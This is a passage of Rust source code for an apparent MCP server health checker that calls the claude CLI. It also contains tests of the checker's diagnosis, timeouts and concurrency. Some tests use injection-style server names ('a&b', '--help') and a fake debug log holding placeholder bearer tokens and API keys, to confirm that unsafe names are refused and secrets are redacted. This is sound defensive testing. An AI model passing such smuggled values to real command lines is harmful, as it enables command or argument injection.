        *lock(&shared.version) = Some((stamp, version.clone()));
    }
    version
}

fn cli_version(shared: &Shared, program: &Path) -> Option<String> {
    let out = runner::run(&RunSpec {
        program,
        args: &["--version"],
        cwd: shared.config.home.as_deref(),
        env: &cli_env(shared),
        timeout: VERSION_TIMEOUT,
        max_output: 1024,
    })
    .ok()?;
    let token = out.stdout.split_whitespace().next()?;
    (out.exit_code == Some(0) && token.starts_with(|c: char| c.is_ascii_digit()))
        .then(|| clip(token, 32))
}

fn claude_program(shared: &Shared) -> Option<PathBuf> {
    shared
        .claude
        .read()
        .unwrap_or_else(|e| e.into_inner())
        .clone()
}

fn execute(shared: &Shared, job: &Job) -> (Status, Option<String>) {
    let Some(program) = claude_program(shared) else {
        return (
            Status::Unknown,
            Some("the claude CLI is not available".to_owned()),
        );
    };
    let timeout = shared.config.check_timeout;
    let result = runner::run(&RunSpec {
        program: &program,
        args: &["mcp", "get", job.name.as_str()],
        cwd: Some(&job.cwd),
        env: &cli_env(shared),
        timeout,
        max_output: MAX_CHECK_OUTPUT,
    });
    interpret(result, timeout)
}

/// What a finished `claude mcp get` means: a status, and a reason when there is no verdict.
fn interpret(result: io::Result<RunOutput>, timeout: Duration) -> (Status, Option<String>) {
    match result {
        Err(e) => (
            Status::Unknown,
            Some(clip(
                &format!("could not run claude: {}", sanitize(&e.to_string())),
                MAX_DETAIL_CHARS,
            )),
        ),
        Ok(out) if out.timed_out => (
            Status::Unknown,
            Some(format!(
                "check timed out after {:.1}s",
                timeout.as_secs_f32()
            )),
        ),
        Ok(out) if out.exit_code != Some(0) => {
            let line = out
                .stderr
                .lines()
                .map(str::trim)
                .find(|l| !l.is_empty())
                .map(|l| clip(l, MAX_DETAIL_CHARS))
                .unwrap_or_else(|| format!("claude exited with code {:?}", out.exit_code));
            (Status::Unknown, Some(line))
        }
        Ok(out) => {
            let checked = parse::parse_get(&out.stdout);
            if checked.status == Status::Unknown && checked.detail.is_none() {
                (
                    Status::Unknown,
                    Some("unrecognised output from claude".to_owned()),
                )
            } else {
                (checked.status, checked.detail)
            }
        }
    }
}

/// Runs the check again with the client's own debug output and turns that into a safe, readable diagnosis.
/// The debug file lives in a private temporary folder that is removed when this function returns.
fn run_diagnose(shared: &Shared, job: &Job) -> Diagnosis {
    let nothing = |note: String| Diagnosis {
        status: Status::Unknown,
        detail: None,
        hints: Vec::new(),
        server_said: Vec::new(),
        client_log: Vec::new(),
        note: Some(note),
    };
    let Some(program) = claude_program(shared) else {
        return nothing("the claude CLI is not available".to_owned());
    };
    let dir = match tempfile::Builder::new()
        .prefix("klefki-diagnose-")
        .tempdir()
    {
        Ok(dir) => dir,
        Err(e) => {
            return nothing(format!(
                "could not create a private temporary folder: {}",
                sanitize(&e.to_string())
            ));
        }
    };
    let file = dir.path().join("debug.log");
    let Some(file_arg) = file.to_str() else {
        return nothing("the temporary path is not valid text".to_owned());
    };
    let timeout = shared.config.check_timeout;
    let result = runner::run(&RunSpec {
        program: &program,
        args: &[
            "--debug",
            "mcp",
            "--debug-file",
            file_arg,
            "mcp",
            "get",
            job.name.as_str(),
        ],
        cwd: Some(&job.cwd),
        env: &cli_env(shared),
        timeout,
        max_output: MAX_CHECK_OUTPUT,
    });
    let stderr = result
        .as_ref()
        .ok()
        .map(|o| o.stderr.clone())
        .unwrap_or_default();
    let timed_out = matches!(&result, Ok(o) if o.timed_out);
    let (status, detail) = interpret(result, timeout);

    let (debug_text, read_note) = match fsx::read_limited(&file, MAX_DEBUG_FILE) {
        Ok(Some(text)) => (text, None),
        Ok(None) => (
            String::new(),
            Some("the client wrote no debug output".to_owned()),
        ),
        Err(e) => (
            String::new(),
            Some(format!(
                "could not read the debug output: {}",
                sanitize(&e.to_string())
            )),
        ),
    };
    let note = if timed_out { detail.clone() } else { read_note };
    let said = format!("{}\n{}", detail.as_deref().unwrap_or(""), stderr);
    let report = report::build(&debug_text, job.name.as_str(), &said);
    Diagnosis {
        status,
        detail,
        hints: report
            .hints
            .iter()
            .map(|&kind| hint(kind, &format!("{said}\n{debug_text}")))
            .collect(),
        server_said: report.server_said,
        client_log: report.client_log,
        note,
    }
}

/// `said` is the text the failure was recognised in, where its error code is looked up.
fn hint(kind: HintKind, said: &str) -> Hint {
    Hint {
        title: kind.title().to_owned(),
        code: kind.code_in(said).map(str::to_owned),
        help: kind.help().iter().map(|&line| line.to_owned()).collect(),
        points_at: kind
            .points_at()
            .map(|(focus, label)| (focus, label.to_owned())),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::cli::testutil::{fake_claude, write_scenario};
    use crate::model::Target;
    use std::time::Instant;

    const WAIT: Duration = Duration::from_secs(15);

    struct Env {
        dir: tempfile::TempDir,
        log: PathBuf,
    }

    impl Env {
        fn new(claude_json: &serde_json::Value, scenario: &str, files: &[(&str, &[u8])]) -> Self {
            let dir = tempfile::tempdir().unwrap();
            std::fs::create_dir_all(dir.path().join("cfg")).unwrap();
            std::fs::create_dir_all(dir.path().join("home")).unwrap();
            std::fs::write(
                dir.path().join("cfg").join(".claude.json"),
                claude_json.to_string(),
            )
            .unwrap();
            write_scenario(dir.path(), scenario, files);
            let log = dir.path().join("log.jsonl");
            Env { dir, log }
        }

        fn config(&self) -> EngineConfig {
            EngineConfig {
                paths: Some(ConfigPaths::in_dir(self.dir.path().join("cfg"))),
                claude: Some(fake_claude().to_path_buf()),
                home: Some(self.dir.path().join("home")),
                path_var: None,
                cli_env: vec![
                    (
                        "FAKE_CLAUDE_SCENARIO".into(),
                        self.dir.path().join("scenario.json").into(),
                    ),
                    ("FAKE_CLAUDE_LOG".into(), self.log.clone().into()),
                ],
                backup_dir: Some(self.dir.path().join("backups")),
                verify_delay: Duration::from_millis(50),
                max_checks: 3,
                check_timeout: Duration::from_secs(10),
                watch_interval: Some(Duration::from_millis(40)),
                watch_settle: Duration::from_millis(120),
                // Never the real keychain in tests.
                secrets: Some(Arc::new(crate::secrets::MemoryStore::default())),
            }
        }

        fn start(&self) -> Core {
            start_with(self.config(), || {})
        }

        /// Every `mcp get <name>` the fake CLI was asked to run, with its start and end times.
        fn gets(&self) -> Vec<(String, u64, u64)> {
            let lines: Vec<serde_json::Value> = std::fs::read_to_string(&self.log)
                .unwrap_or_default()
                .lines()
                .map(|l| {
                    serde_json::from_str(l).unwrap_or_else(|e| panic!("bad log line {l:?}: {e}"))
                })
                .collect();
            let mut out = Vec::new();
            for start in lines.iter().filter(|l| l["event"] == "start") {
                let argv = start["argv"].as_array().unwrap();
                if argv.len() == 3 && argv[0] == "mcp" && argv[1] == "get" {
                    let end = lines
                        .iter()
                        .find(|l| l["event"] == "end" && l["argv"] == start["argv"])
                        .map(|l| l["ms"].as_u64().unwrap())
                        .unwrap_or(u64::MAX);
                    out.push((
                        argv[2].as_str().unwrap().to_owned(),
                        start["ms"].as_u64().unwrap(),
                        end,
                    ));
                }
            }
            out
        }
    }

    /// Collects events until `done` says so, or panics after `WAIT`.
    fn collect(core: &Core, mut done: impl FnMut(&[Event]) -> bool) -> Vec<Event> {
        let deadline = Instant::now() + WAIT;
        let mut events = Vec::new();
        loop {
            while let Some(e) = core.try_recv() {
                events.push(e);
            }
            if done(&events) {
                return events;
            }
            assert!(Instant::now() < deadline, "timed out; got {events:#?}");
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    fn status_of(events: &[Event], name: &str) -> Option<(Status, Option<String>)> {
        events.iter().rev().find_map(|e| match e {
            Event::Status {
                id, status, detail, ..
            } if id.name == name => Some((*status, detail.clone())),
            _ => None,
        })
    }

    fn final_status(events: &[Event], name: &str) -> Option<Status> {
        events
            .iter()
            .filter_map(|e| match e {
                Event::Status { id, status, .. }
                    if id.name == name && *status != Status::Checking =>
                {
                    Some(*status)
                }
                _ => None,
            })
            .next_back()
    }

    const CONNECTED: &[u8] = include_bytes!("../../../fixtures/mcp-get/connected-stdio.txt");
    const FAILED: &[u8] = include_bytes!("../../../fixtures/mcp-get/failed-stdio.txt");
    const PENDING: &[u8] = include_bytes!("../../../fixtures/mcp-get/pending-approval.txt");

    fn http(url: &str) -> serde_json::Value {
        serde_json::json!({"type": "http", "url": url})
    }

    #[test]
    fn startup_loads_the_snapshot_finds_the_cli_and_checks_unknown_servers() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "azure-devops": {"type": "stdio", "command": "npx"},
                "broken": {"type": "stdio", "command": "nope"}}}),
            r#"{"rules":[
                {"args":["--version"],"stdout_file":"version.txt"},
                {"args":["mcp","get","azure-devops"],"stdout_file":"connected.txt"},
                {"args":["mcp","get","broken"],"stdout_file":"failed.txt"}]}"#,
            &[
                ("version.txt", b"2.1.302 (Claude Code)\n"),
                ("connected.txt", CONNECTED),
                ("failed.txt", FAILED),
            ],
        );
        let core = env.start();
        let events = collect(&core, |e| {
            final_status(e, "azure-devops").is_some()
                && final_status(e, "broken").is_some()
                && e.iter().any(|x| matches!(x, Event::CliVersion(Some(_))))
        });
        assert!(
            matches!(&events[0], Event::Snapshot(s) if s.servers.len() == 2),
            "the snapshot comes first: {:?}",
            events[0]
        );
        assert_eq!(
            final_status(&events, "azure-devops"),
            Some(Status::Connected)
        );
        let (st, detail) = status_of(&events, "broken").unwrap();
        assert_eq!(st, Status::Failed);
        assert_eq!(
            detail.as_deref(),
            Some("CONNECTION_CLOSED: Connection closed")
        );
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::CliVersion(Some(v)) if v == "2.1.302"))
        );
        // Rows with no cached status show "checking" while they wait.
        assert_eq!(
            events.iter().find_map(|e| match e {
                Event::Status { id, status, .. } if id.name == "azure-devops" => Some(*status),
                _ => None,
            }),
            Some(Status::Checking)
        );
    }

    #[test]
    fn servers_claude_already_knows_are_not_rechecked_until_a_full_refresh() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "known": http("https://a.example.com"),
                "fresh": {"type": "stdio", "command": "x"}}}),
            r#"{"rules":[{"args":["mcp","get","known"],"stdout_file":"c.txt"},
                        {"args":["mcp","get","fresh"],"stdout_file":"c.txt"},
                        {"args":["--version"]}]}"#,
            &[("c.txt", CONNECTED)],
        );
        std::fs::write(
            env.dir.path().join("cfg").join("mcp-health-cache.json"),
            r#"{"version":1,"servers":{"known":{"status":"healthy"}}}"#,
        )
        .unwrap();
        let core = env.start();
        collect(&core, |e| final_status(e, "fresh").is_some());
        let names: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(
            names,
            vec!["fresh"],
            "only the unknown server is checked at startup"
        );

        core.send(Command::Refresh { live_all: true });
        collect(&core, |_| env.gets().iter().any(|g| g.0 == "known"));
        let mut names: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        names.sort();
        assert!(names.contains(&"known".to_owned()));
    }

    #[test]
    fn project_servers_are_only_checked_on_request_and_run_in_their_folder() {
        let env = Env::new(
            &serde_json::json!({}),
            r#"{"rules":[{"args":["--version"]},
            {"args":["mcp","get","docs"],"stdout_file":"p.txt"}]}"#,
            &[("p.txt", PENDING)],
        );
        let project = env.dir.path().join("proj");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::write(
            project.join(".mcp.json"),
            r#"{"mcpServers":{"docs":{"command":"node"}}}"#,
        )
        .unwrap();
        std::fs::write(
            env.dir.path().join("cfg").join(".claude.json"),
            serde_json::json!({"projects": {project.to_string_lossy(): {}}}).to_string(),
        )
        .unwrap();
        let core = env.start();
        let events = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        std::thread::sleep(Duration::from_millis(600));
        assert!(env.gets().is_empty(), "nothing runs until the user asks");
        let Event::Snapshot(snap) = &events[0] else {
            panic!()
        };
        let row = snap
            .servers
            .iter()
            .find(|r| r.scope == Scope::Project)
            .unwrap();

        core.send(Command::Check(row.id()));
        let events = collect(&core, |e| final_status(e, "docs").is_some());
        assert_eq!(final_status(&events, "docs"), Some(Status::PendingApproval));
        let log = std::fs::read_to_string(&env.log).unwrap();
        let start: serde_json::Value = log
            .lines()
            .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
            .find(|l| l["event"] == "start" && l["argv"][2] == "docs")
            .unwrap();
        assert_eq!(
            std::path::Path::new(start["cwd"].as_str().unwrap()).file_name(),
            project.file_name()
        );
    }

    #[test]
    fn a_name_that_is_not_safe_never_reaches_the_cli() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "a&b": {"command": "x"}, "--help": {"command": "x"}, "ok": {"command": "x"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get","ok"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = env.start();
        let events = collect(&core, |e| {
            ["a&b", "--help", "ok"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        assert_eq!(final_status(&events, "ok"), Some(Status::Connected));
        for bad in ["a&b", "--help"] {
            let (status, detail) = status_of(&events, bad).unwrap();
            assert_eq!(status, Status::Unknown, "{bad}");
            assert!(detail.unwrap().contains("not checked"), "{bad}");
        }
        let asked: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(
            asked,
            vec!["ok"],
            "only the valid name was ever passed to the CLI"
        );
    }

    #[test]
    fn at_most_three_checks_run_at_once() {
        // Each stub run sleeps a full second so that a slow process start under load cannot hide the overlap.
        let servers: serde_json::Map<String, serde_json::Value> = (0..6)
            .map(|i| (format!("s{i}"), serde_json::json!({"command": "x"})))
            .collect();
        let env = Env::new(
            &serde_json::json!({ "mcpServers": servers }),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":1000}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = env.start();
        collect(&core, |e| {
            (0..6).all(|i| final_status(e, &format!("s{i}")).is_some())
        });
        let gets = env.gets();
        assert_eq!(gets.len(), 6);
        let max_overlap = gets
            .iter()
            .map(|(_, start, _)| {
                gets.iter()
                    .filter(|(_, s, e)| s <= start && start < e)
                    .count()
            })
            .max()
            .unwrap();
        assert!(max_overlap <= 3, "{max_overlap} checks overlapped");
        assert!(
            max_overlap >= 2,
            "the pool should actually run in parallel, saw {max_overlap}"
        );
    }

    #[test]
    fn cli_failures_become_unknown_with_a_reason() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "missing": {"command": "x"}, "slow": {"command": "x"}, "garbage": {"command": "x"}}}),
            r#"{"rules":[{"args":["--version"]},
                {"args":["mcp","get","missing"],"stderr_file":"nf.txt","exit_code":1},
                {"args":["mcp","get","slow"],"hang":true},
                {"args":["mcp","get","garbage"],"stdout_file":"g.txt"}]}"#,
            &[
                ("nf.txt", b"No MCP server named \"missing\"."),
                ("g.txt", b"something completely different\n"),
            ],
        );
        let mut config = env.config();
        // Roomy on purpose: with many tests starting processes at once, a normal start can take a second.
        config.check_timeout = Duration::from_secs(3);
        let core = start_with(config, || {});
        let events = collect(&core, |e| {
            ["missing", "slow", "garbage"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        for (name, needle) in [
            ("missing", "No MCP server named"),
            ("slow", "timed out"),
            ("garbage", "unrecognised"),
        ] {
            let (status, detail) = status_of(&events, name).unwrap();
            assert_eq!(status, Status::Unknown, "{name}");
            let detail = detail.unwrap_or_default();
            assert!(detail.contains(needle), "{name}: {detail:?}");
        }
    }

    fn hint_of(events: &[Event], name: &str) -> Option<Hint> {
        events.iter().rev().find_map(|e| match e {
            Event::Status { id, hint, .. } if id.name == name => Some(hint.clone()),
            _ => None,
        })?
    }

    fn pointing_at(focus: Focus) -> Hint {
        Hint {
            title: "t".into(),
            code: None,
            help: Vec::new(),
            points_at: Some((focus, "label".into())),
        }
    }

    fn spanned<'a>(focus: Focus, target: &'a str, said: Option<&str>) -> Option<&'a str> {
        pointing_at(focus)
            .span(target, said)
            .map(|range| &target[range])
    }

    #[test]
    fn a_hint_points_at_the_part_of_the_url_it_is_about() {
        let url = "https://acme-prod.example.com/gateway/mcp";
        assert_eq!(
            spanned(Focus::Host, url, None),
            Some("acme-prod.example.com")
        );
        assert_eq!(
            spanned(Focus::Address, url, None),
            Some("acme-prod.example.com")
        );
        assert_eq!(spanned(Focus::Path, url, None), Some("/gateway/mcp"));
        // Variants: a port, an IPv6 address, user info, a hidden query, no path at all.
        let port = "http://127.0.0.1:9/mcp";
        assert_eq!(spanned(Focus::Host, port, None), Some("127.0.0.1"));
        assert_eq!(spanned(Focus::Address, port, None), Some("127.0.0.1:9"));
        assert_eq!(
            spanned(Focus::Host, "http://[::1]:8080/mcp", None),
            Some("[::1]")
        );
        assert_eq!(
            spanned(Focus::Address, "http://[::1]:8080/mcp", None),
            Some("[::1]:8080")
        );
        assert_eq!(
            spanned(Focus::Host, "https://me@host.example/x", None),
            Some("host.example")
        );
        assert_eq!(
            spanned(Focus::Path, "https://host.example/mcp?…", None),
            Some("/mcp")
        );
        assert_eq!(spanned(Focus::Path, "https://host.example", None), None);
        // A URL focus never points into a command line, nor a command focus into a URL.
        assert_eq!(spanned(Focus::Host, "npx -y pkg", None), None);
        assert_eq!(spanned(Focus::Command, url, None), None);
    }

    #[test]
    fn a_hint_points_at_the_program_even_when_its_path_has_spaces() {
        assert_eq!(spanned(Focus::Command, "npx -y pkg", None), Some("npx"));
        assert_eq!(
            spanned(
                Focus::Command,
                "npx -y pkg",
                Some("Error: spawn npx ENOENT")
            ),
            Some("npx")
        );
        let spaced = r"C:\Program Files\nodejs\node.exe server.js --port 9";
        assert_eq!(
            spanned(
                Focus::Command,
                spaced,
                Some(
                    r"'C:\Program Files\nodejs\node.exe' is not recognized as an internal or external command"
                )
            ),
            Some(r"C:\Program Files\nodejs\node.exe")
        );
        // Without Claude naming it, only the first word is certain.
        assert_eq!(spanned(Focus::Command, spaced, None), Some(r"C:\Program"));
        let none = Hint {
            points_at: None,
            ..pointing_at(Focus::Host)
        };
        assert_eq!(none.span("https://h.example/mcp", None), None);
    }

    #[test]
    fn a_hint_is_named_by_the_code_it_was_reported_with() {
        let enotfound = hint(
            HintKind::HostNotFound,
            "getaddrinfo ENOTFOUND acme.example.com",
        );
        assert_eq!(enotfound.code.as_deref(), Some("ENOTFOUND"));
        let again = hint(
            HintKind::HostNotFound,
            "getaddrinfo EAI_AGAIN acme.example.com",
        );
        assert_eq!(again.code.as_deref(), Some("EAI_AGAIN"));
        // Whole words only: a host or port containing the digits is not a status code.
        let port = hint(
            HintKind::Forbidden,
            "forbidden by http://h.example:14030/mcp",
        );
        assert_eq!(port.code, None);
        assert_eq!(
            hint(HintKind::Forbidden, "HTTP 403 Forbidden")
                .code
                .as_deref(),
            Some("403")
        );
        assert_eq!(
            hint(HintKind::HostNotFound, "could not resolve host").code,
            None
        );
        assert_eq!(enotfound.help.len(), HintKind::HostNotFound.help().len());
        assert_eq!(
            enotfound.points_at,
            Some((Focus::Host, "this name could not be looked up".into()))
        );
    }

    #[test]
    fn an_unknown_host_is_explained_as_the_network_or_vpn_with_claudes_words_kept() {
        // How Claude reports an HTTP server whose host name it cannot look up, e.g. a company server off the VPN.
        let issue = |name: &str, said: &str| {
            format!(
                "{name}:\n  Scope: User config (available in all your projects)\n  Status: ✘ Failed to connect\n  Issue: {said}\n  Type: http\n  URL: https://{name}.example.com/mcp\n"
            )
        };
        let enotfound = issue(
            "acme-prod",
            "ENOTFOUND: getaddrinfo ENOTFOUND acme-prod.example.com",
        );
        // The variant: the lookup failed for now (no answer from the DNS server) rather than for good.
        let eai_again = issue("acme-dev", "getaddrinfo EAI_AGAIN acme-dev.example.com");
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "acme-prod": http("https://acme-prod.example.com/mcp"),
                "acme-dev": http("https://acme-dev.example.com/mcp"),
                "azure-devops": {"type": "stdio", "command": "npx"}}}),
            r#"{"rules":[
                {"args":["--version"],"stdout_file":"version.txt"},
                {"args":["mcp","get","acme-prod"],"stdout_file":"prod.txt"},
                {"args":["mcp","get","acme-dev"],"stdout_file":"dev.txt"},
                {"args":["mcp","get","azure-devops"],"stdout_file":"connected.txt"}]}"#,
            &[
                ("version.txt", b"2.1.302 (Claude Code)\n"),
                ("prod.txt", enotfound.as_bytes()),
                ("dev.txt", eai_again.as_bytes()),
                ("connected.txt", CONNECTED),
            ],
        );
        let core = env.start();
        let events = collect(&core, |e| {
            ["acme-prod", "acme-dev", "azure-devops"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        for (name, said) in [
            ("acme-prod", "getaddrinfo ENOTFOUND acme-prod.example.com"),
            ("acme-dev", "getaddrinfo EAI_AGAIN acme-dev.example.com"),
        ] {
            let (status, detail) = status_of(&events, name).unwrap();
            assert_eq!(status, Status::Failed, "{name}");
            assert!(
                detail.as_deref().is_some_and(|d| d.contains(said)),
                "{name}: Claude's own words stay available: {detail:?}"
            );
            let hint = hint_of(&events, name).unwrap_or_else(|| panic!("{name}: no explanation"));
            assert!(
                !hint.title.contains("ENOTFOUND") && !hint.title.contains("getaddrinfo"),
                "{name}: the title is plain language: {hint:?}"
            );
            // The usual causes, being offline or off the VPN, come before the rarer typo in the URL.
            let advice = hint.help.join(" ").to_lowercase();
            let at = |word: &str| advice.find(word).unwrap_or(usize::MAX);
            assert!(
                at("offline") < at("typo") && at("vpn") < at("typo"),
                "{name}: {hint:?}"
            );
        }
        assert_eq!(
            hint_of(&events, "azure-devops"),
            None,
            "a connected server needs no explanation"
        );
    }

    #[test]
    fn a_missing_cli_is_reported_and_nothing_crashes() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"a": {"command": "x"}}}),
            r#"{"rules":[]}"#,
            &[],
        );
        let mut config = env.config();
        config.claude = None;
        config.path_var = Some(env.dir.path().join("empty").into());
        let core = start_with(config, || {});
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::CliProblem(_)))
        });
        assert!(matches!(&events[0], Event::Snapshot(s) if s.servers.len() == 1));
        assert!(
            status_of(&events, "a").is_none(),
            "no check can run without the CLI"
        );
    }

    #[test]
    fn a_detached_core_carries_commands_and_events_both_ways() {
        let (core, engine) = Core::detached();
        core.send(Command::Refresh { live_all: true });
        assert!(matches!(
            engine.commands.try_recv(),
            Ok(Command::Refresh { live_all: true })
        ));
        assert!(core.try_recv().is_none());
        engine
            .events
            .send(Event::CliVersion(Some("1.2.3".to_owned())))
            .unwrap();
        assert!(matches!(core.try_recv(), Some(Event::CliVersion(Some(v))) if v == "1.2.3"));
    }

    #[test]
    fn the_ui_is_woken_when_events_arrive() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        let env = Env::new(
            &serde_json::json!({}),
            r#"{"rules":[{"args":["--version"]}]}"#,
            &[],
        );
        let woken = Arc::new(AtomicUsize::new(0));
        let w = Arc::clone(&woken);
        let core = start_with(env.config(), move || {
            w.fetch_add(1, Ordering::SeqCst);
        });
        collect(&core, |e| !e.is_empty());
        assert!(woken.load(Ordering::SeqCst) >= 1);
    }

    // ---- Diagnose: the client's own debug output, made safe ----

    const DEBUG_STDIO: &[u8] = include_bytes!("../../../fixtures/debug/failed-stdio.log");

    fn diagnosis_of(events: &[Event], name: &str) -> Option<Diagnosis> {
        events.iter().rev().find_map(|e| match e {
            Event::Diagnosis { id, diagnosis } if id.name == name => Some(diagnosis.clone()),
            _ => None,
        })
    }

    fn diagnose_env(extra_rules: &str, files: &[(&str, &[u8])], servers: serde_json::Value) -> Env {
        let scenario = format!(r#"{{"rules":[{{"args":["--version"]}}{extra_rules}]}}"#,);
        Env::new(
            &serde_json::json!({ "mcpServers": servers }),
            &scenario,
            files,
        )
    }

    fn diagnose_args() -> &'static str {
        r#""args":["--debug","mcp","--debug-file","*","mcp","get","bad-stdio"]"#
    }

    #[test]
    fn diagnose_explains_a_failing_stdio_server() {
        let rule = format!(
            r#",{{{},"debug_file_from":"dbg.log","stdout_file":"failed.txt"}}"#,
            diagnose_args()
        );
        let env = diagnose_env(
            &rule,
            &[("dbg.log", DEBUG_STDIO), ("failed.txt", FAILED)],
            serde_json::json!({"bad-stdio": {"command": "definitely-not-a-real-command-xyz"}}),
        );
        let mut config = env.config();
        // Keep the startup check out of the way: the server already has a status.
        config.max_checks = 3;
        let core = start_with(config, || {});
        let events = collect(&core, |e| final_status(e, "bad-stdio").is_some());
        let row = events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => s.servers.first().map(|r| r.id()),
                _ => None,
            })
            .unwrap();
        core.send(Command::Diagnose(row));
        let events = collect(&core, |e| diagnosis_of(e, "bad-stdio").is_some());
        let d = diagnosis_of(&events, "bad-stdio").unwrap();
        assert_eq!(d.status, Status::Failed);
        assert_eq!(d.note, None);
        assert_eq!(d.hints.len(), 1, "{:?}", d.hints);
        assert_eq!(d.hints[0].title, "The command was not found");
        assert_eq!(
            d.server_said,
            vec![
                "'definitely-not-a-real-command-xyz' is not recognized as an internal or external command,",
                "operable program or batch file.",
            ]
        );
        assert!(d.client_log.iter().any(|l| l.contains("CONNECTION_CLOSED")));
        assert!(
            d.client_log.iter().all(|l| l.contains("bad-stdio")),
            "no start-up noise"
        );
    }

    #[test]
    fn diagnose_cleans_up_its_private_temp_file() {
        let rule = format!(
            r#",{{{},"debug_file_from":"dbg.log","stdout_file":"failed.txt"}}"#,
            diagnose_args()
        );
        let env = diagnose_env(
            &rule,
            &[("dbg.log", DEBUG_STDIO), ("failed.txt", FAILED)],
            serde_json::json!({"bad-stdio": {"command": "x"}}),
        );
        let core = env.start();
        let events = collect(&core, |e| final_status(e, "bad-stdio").is_some());
        let id = events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => s.servers.first().map(|r| r.id()),
                _ => None,
            })
            .unwrap();
        core.send(Command::Diagnose(id));
        collect(&core, |e| diagnosis_of(e, "bad-stdio").is_some());
        let log = std::fs::read_to_string(&env.log).unwrap();
        let debug_path = log
            .lines()
            .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
            .find_map(|l| {
                let argv = l["argv"].as_array()?.clone();
                let at = argv.iter().position(|a| a == "--debug-file")?;
                argv.get(at + 1)?.as_str().map(PathBuf::from)
            })
            .expect("the CLI was asked to write a debug file");
        assert!(!debug_path.exists(), "the debug file is deleted");
        assert!(
            !debug_path.parent().unwrap().exists(),
            "and so is its private folder"
        );
        assert_ne!(
            debug_path.parent().unwrap(),
            env.dir.path(),
            "it never wrote into our own folders"
        );
    }

    #[test]
    fn diagnose_never_lets_a_secret_through() {
        let hostile = b"2026-10-17T20:00:00.000Z [DEBUG] MCP server \"bad-stdio\": HTTP transport options: {\"headers\":{\"Authorization\":\"Bearer ENGINESECRET1\"}}\n\
2026-10-17T20:00:01.000Z [ERROR] \"MCP server \\\"bad-stdio\\\" Server stderr: API_KEY=ENGINESECRET2 broke\"\n";
        let rule = format!(
            r#",{{{},"debug_file_from":"dbg.log","stdout_file":"failed.txt"}}"#,
            diagnose_args()
        );
        let env = diagnose_env(
            &rule,
            &[("dbg.log", hostile), ("failed.txt", FAILED)],
            serde_json::json!({"bad-stdio": {"command": "x"}}),
        );
        let core = env.start();
        let events = collect(&core, |e| final_status(e, "bad-stdio").is_some());
        let id = events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => s.servers.first().map(|r| r.id()),
                _ => None,
            })
            .unwrap();
        core.send(Command::Diagnose(id));
        let events = collect(&core, |e| diagnosis_of(e, "bad-stdio").is_some());
        let dump = format!("{:?}", diagnosis_of(&events, "bad-stdio").unwrap());
        assert!(!dump.contains("ENGINESECRET"), "{dump}");
    }

    #[test]
    fn diagnose_refuses_a_name_that_is_not_safe_without_running_anything() {
        let env = diagnose_env("", &[], serde_json::json!({"a&b": {"command": "x"}}));
        let core = env.start();
        let events = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        let Event::Snapshot(snap) = &events[0] else {
            panic!()
        };
        core.send(Command::Diagnose(snap.servers[0].id()));
        let events = collect(&core, |e| diagnosis_of(e, "a&b").is_some());
        let d = diagnosis_of(&events, "a&b").unwrap();
        assert_eq!(d.status, Status::Unknown);
        assert!(d.note.unwrap().contains("not diagnosed"));
        assert!(d.hints.is_empty() && d.client_log.is_empty());
        let log = std::fs::read_to_string(&env.log).unwrap_or_default();
        assert!(!log.contains("--debug"), "nothing was spawned for it");
    }

    #[test]
    fn diagnose_survives_a_hung_client_and_a_missing_debug_file() {
        let rule = r#",{"args":["--debug","mcp","--debug-file","*","mcp","get","slow"],"hang":true},
                {"args":["--debug","mcp","--debug-file","*","mcp","get","quiet"],"stdout_file":"failed.txt"}"#;
        let env = diagnose_env(
            rule,
            &[("failed.txt", FAILED)],
            serde_json::json!({"slow": {"command": "x"}, "quiet": {"command": "x"}}),
        );
        let mut config = env.config();
        config.check_timeout = Duration::from_secs(3);
        let core = start_with(config, || {});
        let events = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        let Event::Snapshot(snap) = &events[0] else {
            panic!()
        };
        for r in &snap.servers {
            core.send(Command::Diagnose(r.id()));
        }
        let events = collect(&core, |e| {
            diagnosis_of(e, "slow").is_some() && diagnosis_of(e, "quiet").is_some()
        });
        let slow = diagnosis_of(&events, "slow").unwrap();
        assert_eq!(slow.status, Status::Unknown);
        assert!(slow.note.unwrap().contains("timed out"));
        let quiet = diagnosis_of(&events, "quiet").unwrap();
        assert_eq!(
            quiet.status,
            Status::Failed,
            "the normal output is still read"
        );
        assert!(quiet.note.unwrap().contains("no debug output"));
        assert!(quiet.client_log.is_empty());
    }

    #[test]
    fn diagnose_also_updates_the_servers_status() {
        let rule = format!(
            r#",{{{},"debug_file_from":"dbg.log","stdout_file":"failed.txt"}}"#,
            diagnose_args()
        );
        let env = diagnose_env(
            &rule,
            &[("dbg.log", DEBUG_STDIO), ("failed.txt", FAILED)],
            serde_json::json!({"bad-stdio": {"command": "x"}}),
        );
